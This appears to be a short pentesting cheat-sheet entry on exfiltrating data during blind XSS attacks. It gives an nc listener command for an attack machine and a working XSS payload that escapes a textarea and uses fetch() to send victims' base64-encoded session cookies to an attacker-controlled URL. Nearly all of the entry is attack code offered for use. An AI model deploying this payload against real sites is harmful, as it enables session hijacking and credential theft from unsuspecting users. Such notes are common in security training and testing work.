# Web client/server

## Exfiltrate data to another web server

In scenarions like blind XSS, you might need a way to exfiltrate data like session cookies or credentials from another users.

To do so, first launch a listening server on your local host or an attack VM. Example:

```sh
nc -nlvp PORT_NUMBER
```

Then, in your XSS payload, make sure to request to URL of the listening server and insert the session cookie in a URL parameter or a query string. Example

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```
